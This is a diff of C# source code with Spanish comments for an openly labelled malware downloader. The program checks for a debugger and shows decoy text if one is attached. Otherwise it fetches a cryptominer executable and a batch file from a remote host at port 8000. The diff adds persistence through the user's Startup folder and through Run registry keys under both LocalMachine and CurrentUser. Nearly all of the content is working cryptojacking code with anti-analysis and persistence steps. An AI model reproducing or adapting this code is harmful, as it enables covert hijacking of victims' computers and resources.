@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -29,6 +29,8 @@ namespace downloader
         static string criptomining_file = "cpuminer-gw64-corei7.exe";
         static string bat_file = "cript.bat";
         static int remotePort = 8000;
+        static string dest_file = "cript.exe";
+        static string bat_dest_file = "cript.bat";
 
         //Estas lineas sirven para revisar si es ejecutado por un debuggeador
         // Tomadas de https://www.codeproject.com/Articles/670193/Csharp-Detect-if-Debugger-is-Attached
@@ -61,7 +63,7 @@ namespace downloader
             //Se contruye la URI para descargar el criptominer
             // De esta manera el criptomining debe estar en la raiz del host como
             //http://192.168.0.18:8000/criptominig.exe
-            string dest_file = "cript.exe", bat_dest_file = "cript.bat";
+            //string dest_file = "cript.exe", bat_dest_file = "cript.bat";
 
             // Descargamos el criptomining
             if (!File.Exists(Environment.GetEnvironmentVariable("windir") + "\\" + dest_file))
@@ -69,15 +71,44 @@ namespace downloader
                 download_File(criptomining_file, Environment.GetEnvironmentVariable("windir") + "\\" + dest_file);
             }
             // Descargamos el archivo bat para ejecutar el criptomining
-            if (!File.Exists(Environment.GetEnvironmentVariable("windir") + "\\" + bat_dest_file))
+            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +  "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + bat_dest_file))
             {
-                download_File(bat_file, Environment.GetEnvironmentVariable("windir") + "\\" + bat_dest_file);
+                //download_File(bat_file, Environment.GetEnvironmentVariable("windir") + "\\" + bat_dest_file);
+
+                // Descargamos el bat directo en la carpeta de startup, generando una opcion de persistencia
+                download_File(bat_file, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +  "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + bat_dest_file);
+                // Copiamos el archivo bat para con este crear la persistencia en las llaves de registro
+                File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + bat_dest_file, Environment.GetEnvironmentVariable("windir") + "\\" + bat_dest_file, true);
             }
             // Ya que se necesitan los archivos para ser ejecutados, se decidio no hacer las
             // descargas en otro hilo
 
             // Ejecuta el archivo bat una vez descargado
-            Process.Start(bat_dest_file);
+            // Es necesario que el bat se encuentre en WINDIR, o poner ruta absoluta
+            // Process.Start(bat_dest_file);
+        }
+
+        static void create_reg_keys()
+        {
+            /*
+             * Metodo para crear las llaves de registro para la persistencia
+             * del malware.
+             * Se crean en LocalMachine y CurrentUser
+             */
+
+            //Obtenemos el comando dentro del archivo bat
+            string bat_command = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\" + bat_dest_file);
+            Microsoft.Win32.RegistryKey key;
+            //Creamos la llave en LM
+            key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            //Asignamos una nueva entrada con el comando del archivo bat
+            //al comando le quitamos el inicio "start "
+            key.SetValue("cript", bat_command.Substring(6));
+            //Creamos la llave en CU
+            key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            //Asignamos una nueva entrada con el comando del archivo bat
+            //al comando le quitamos el inicio "start "
+            key.SetValue("cript", bat_command.Substring(6));
         }
 
         static void Main(string[] args)
@@ -91,12 +122,14 @@ namespace downloader
             if (isDebuggerPresent)
             {
                 Console.WriteLine("ESCRIBIR UNA CADENA RELACIONADA AL SENUELO");
-                //Console.ReadLine();
+                Console.Write(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+                Console.ReadLine();
             }
             // Si no es debuggeado, se ejecuta el downloader
             else
             {
                 downloaderM();
+                create_reg_keys();
             }
 
             // Para eliminar archivos pdb
